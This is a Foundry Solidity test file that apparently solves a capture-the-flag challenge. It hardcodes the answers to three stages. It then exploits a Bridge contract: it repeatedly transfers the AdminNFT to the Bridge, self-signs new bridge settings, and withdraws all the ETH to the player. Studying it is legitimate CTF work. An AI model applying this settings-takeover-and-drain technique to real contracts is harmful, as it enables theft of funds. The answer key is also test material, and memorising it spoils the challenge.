// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

contract ChallengeTest is Test {
    Challenge public challenge;
    address player;
    uint256 playerKey;

    AdminNFT public ADMIN_NFT;
    Bridge public BRIDGE;

    function setUp() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey);

        playerKey = deployerPrivateKey;
        player = wallet.addr;
        console.log("player", player);

        deal(address(this), 1000 ether);
        challenge = new Challenge{value: 100 ether}(player);
        ADMIN_NFT = challenge.ADMIN_NFT();
        BRIDGE = challenge.BRIDGE();
    }

    function test_S() public {
        vm.startPrank(player);
        solve1();
        require(challenge.stage1Solved(), "stage 1 not solved");
        solve2();
        require(challenge.stage2Solved(), "stage 2 not solved");
        solve3();
        require(challenge.stage3Solved(), "stage 3 not solved");

        BRIDGE.verifyChallenge();

        solve4();

        bool isSolved = challenge.isSolved();
        require(isSolved, "not solved");

        vm.stopPrank();
    }

    function solve1() internal {
        challenge.solveStage1(95);
    }

    function solve2() internal {
        challenge.solveStage2(59, 101);
    }

    function solve3() internal {
        challenge.solveStage3(0, 1, 6);
    }

    function solve4() internal {
        for (uint256 i = 0; i < 500; i++) {
            ADMIN_NFT.safeTransferFrom(player, address(BRIDGE), 0, 0, "");
        }
        bytes[] memory signatures = new bytes[](1);
        Solver solver = new Solver();
        address newChallengeContract = address(challenge);
        address newAdminNFT = address(ADMIN_NFT);
        uint256 thresHold = 0x10000000000000000000000000000;

        bytes memory message = abi.encode(newChallengeContract, newAdminNFT, thresHold);
        bytes32 hashMessage = ECDSA.toEthSignedMessageHash(message);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerKey, hashMessage);
        //vrs to signature
        bytes memory signature = abi.encodePacked(r, s, v);
        signatures[0] = signature;

        BRIDGE.changeBridgeSettings(message, signatures);

        //withdraw all ETH
        BRIDGE.withdrawEth(hashMessage, new bytes[](0), player, type(uint256).max, "");
    }
}
